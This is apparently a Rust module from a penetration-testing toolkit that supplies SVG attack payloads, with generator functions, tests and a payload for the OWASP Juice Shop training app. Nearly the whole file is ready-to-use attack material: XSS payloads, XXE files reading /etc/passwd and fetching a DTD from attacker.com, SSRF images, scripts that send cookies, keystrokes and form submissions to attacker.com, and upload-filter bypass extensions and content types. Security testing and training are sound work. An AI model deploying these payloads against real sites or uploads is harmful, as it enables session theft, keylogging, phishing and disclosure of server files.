//! SVG injection and Cross-Site Imaging utilities
//!
//! Provides payloads for SVG-based XSS and image manipulation attacks.

/// SVG payload with description
#[derive(Debug, Clone)]
pub struct SvgPayload {
    pub name: String,
    pub payload: String,
    pub category: SvgCategory,
    pub file_content: Option<String>,
}

#[derive(Debug, Clone, PartialEq)]
pub enum SvgCategory {
    Xss,
    Xxe,
    Ssrf,
    InfoLeak,
    Dos,
}

impl SvgPayload {
    pub fn new(name: &str, payload: &str, category: SvgCategory) -> Self {
        Self {
            name: name.to_string(),
            payload: payload.to_string(),
            category,
            file_content: None,
        }
    }

    pub fn with_file(name: &str, payload: &str, file_content: &str, category: SvgCategory) -> Self {
        Self {
            name: name.to_string(),
            payload: payload.to_string(),
            category,
            file_content: Some(file_content.to_string()),
        }
    }
}

/// Basic SVG XSS payloads
pub fn svg_xss_payloads() -> Vec<SvgPayload> {
    vec![
        SvgPayload::with_file(
            "onload XSS",
            r#"<svg onload="alert('XSS')">"#,
            r##"<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
  <rect width="100" height="100"/>
</svg>"##,
            SvgCategory::Xss,
        ),
        SvgPayload::with_file(
            "script tag XSS",
            r#"<svg><script>alert('XSS')</script></svg>"#,
            r##"<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script type="text/javascript">alert('XSS')</script>
</svg>"##,
            SvgCategory::Xss,
        ),
        SvgPayload::with_file(
            "foreignObject XSS",
            r#"<svg><foreignObject><body onload="alert('XSS')"></foreignObject></svg>"#,
            r##"<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml" onload="alert('XSS')">
      <p>Test</p>
    </body>
  </foreignObject>
</svg>"##,
            SvgCategory::Xss,
        ),
        SvgPayload::with_file(
            "animate XSS",
            r#"<svg><animate onbegin="alert('XSS')"/></svg>"#,
            r##"<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <animate attributeName="x" onbegin="alert('XSS')" dur="1s"/>
</svg>"##,
            SvgCategory::Xss,
        ),
        SvgPayload::with_file(
            "set XSS",
            r#"<svg><set onbegin="alert('XSS')"/></svg>"#,
            r##"<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <set attributeName="x" onbegin="alert('XSS')" to="100"/>
</svg>"##,
            SvgCategory::Xss,
        ),
        SvgPayload::with_file(
            "use XSS",
            r##"<svg><use href="#" onerror="alert('XSS')"/></svg>"##,
            r##"<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <use xlink:href="#invalid" onerror="alert('XSS')"/>
</svg>"##,
            SvgCategory::Xss,
        ),
        SvgPayload::with_file(
            "image onerror XSS",
            r#"<svg><image onerror="alert('XSS')" href="x"/></svg>"#,
            r##"<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="x" onerror="alert('XSS')"/>
</svg>"##,
            SvgCategory::Xss,
        ),
    ]
}

/// SVG XXE payloads
pub fn svg_xxe_payloads() -> Vec<SvgPayload> {
    vec![
        SvgPayload::with_file(
            "File read via XXE",
            "SVG with external entity",
            r##"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>"##,
            SvgCategory::Xxe,
        ),
        SvgPayload::with_file(
            "SSRF via XXE",
            "SVG with external URL",
            r##"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://internal-server/secret">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>"##,
            SvgCategory::Ssrf,
        ),
        SvgPayload::with_file(
            "Parameter entity XXE",
            "SVG with parameter entity",
            r##"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">XXE</text>
</svg>"##,
            SvgCategory::Xxe,
        ),
    ]
}

/// SVG SSRF payloads
pub fn svg_ssrf_payloads() -> Vec<SvgPayload> {
    vec![
        SvgPayload::with_file(
            "External image SSRF",
            "SVG loading external image",
            r##"<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://internal-server:8080/admin" width="100" height="100"/>
</svg>"##,
            SvgCategory::Ssrf,
        ),
        SvgPayload::with_file(
            "External stylesheet SSRF",
            "SVG with external stylesheet",
            r##"<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/css" href="http://internal-server/style.css"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100"/>
</svg>"##,
            SvgCategory::Ssrf,
        ),
        SvgPayload::with_file(
            "Use external reference SSRF",
            "SVG use with external reference",
            r##"<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <use xlink:href="http://internal-server/image.svg#element"/>
</svg>"##,
            SvgCategory::Ssrf,
        ),
    ]
}

/// Cross-Site Imaging attack payloads
pub fn cross_site_imaging_payloads() -> Vec<SvgPayload> {
    vec![
        SvgPayload::with_file(
            "Cookie stealing via img",
            "Image that steals cookies",
            r##"<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script type="text/javascript">
    new Image().src='http://attacker.com/steal?c='+document.cookie;
  </script>
</svg>"##,
            SvgCategory::Xss,
        ),
        SvgPayload::with_file(
            "Keylogger via SVG",
            "SVG that logs keystrokes",
            r##"<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    document.onkeypress=function(e){
      new Image().src='http://attacker.com/log?k='+e.key;
    };
  </script>
</svg>"##,
            SvgCategory::Xss,
        ),
        SvgPayload::with_file(
            "Form hijacking",
            "SVG that hijacks form submissions",
            r##"<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    setTimeout(function(){
      document.forms[0].action='http://attacker.com/phish';
    }, 1000);
  </script>
</svg>"##,
            SvgCategory::Xss,
        ),
    ]
}

/// Generate custom SVG XSS payload
pub fn generate_svg_xss(script: &str) -> String {
    format!(
        r##"<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script type="text/javascript">
    {}
  </script>
</svg>"##,
        script
    )
}

/// Generate SVG with external resource (for SSRF)
pub fn generate_svg_ssrf(url: &str) -> String {
    format!(
        r##"<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="{}" width="100" height="100"/>
</svg>"##,
        url
    )
}

/// Generate SVG XXE payload
pub fn generate_svg_xxe(file_path: &str) -> String {
    format!(
        r##"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file://{}">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>"##,
        file_path
    )
}

/// Juice Shop Cross-Site Imaging payload
pub fn juice_shop_cross_site_imaging() -> SvgPayload {
    SvgPayload::with_file(
        "Juice Shop Cross-Site Imaging",
        "SVG for Cross-Site Imaging challenge",
        r##"<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script type="text/javascript">
    alert(document.domain);
  </script>
  <image xlink:href="http://localhost:3000/assets/public/images/products/apple_juice.jpg"/>
</svg>"##,
        SvgCategory::Xss,
    )
}

/// Content-Type headers for SVG upload bypass
pub fn svg_content_types() -> Vec<&'static str> {
    vec![
        "image/svg+xml",
        "image/svg",
        "text/xml",
        "application/xml",
        "text/html",  // May work in some cases
        "image/png",  // Bypass attempt
        "image/jpeg", // Bypass attempt
    ]
}

/// SVG file extensions for upload bypass
pub fn svg_extensions() -> Vec<&'static str> {
    vec![
        ".svg",
        ".svgz",       // Compressed SVG
        ".svg.png",    // Double extension
        ".svg%00.png", // Null byte
        ".svg;.png",   // Semicolon
        ".SVG",        // Case variation
        ".Svg",
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_svg_xss_payloads() {
        let payloads = svg_xss_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p
            .file_content
            .as_ref()
            .map(|c| c.contains("alert"))
            .unwrap_or(false)));
    }

    #[test]
    fn test_svg_xxe_payloads() {
        let payloads = svg_xxe_payloads();
        assert!(payloads.iter().any(|p| p
            .file_content
            .as_ref()
            .map(|c| c.contains("ENTITY"))
            .unwrap_or(false)));
    }

    #[test]
    fn test_generate_svg_xss() {
        let svg = generate_svg_xss("alert('test')");
        assert!(svg.contains("alert('test')"));
        assert!(svg.contains("<svg"));
    }

    #[test]
    fn test_generate_svg_ssrf() {
        let svg = generate_svg_ssrf("http://internal:8080");
        assert!(svg.contains("http://internal:8080"));
    }

    #[test]
    fn test_generate_svg_xxe() {
        let svg = generate_svg_xxe("/etc/passwd");
        assert!(svg.contains("/etc/passwd"));
        assert!(svg.contains("ENTITY"));
    }

    #[test]
    fn test_juice_shop_payload() {
        let payload = juice_shop_cross_site_imaging();
        assert!(payload.file_content.is_some());
    }
}
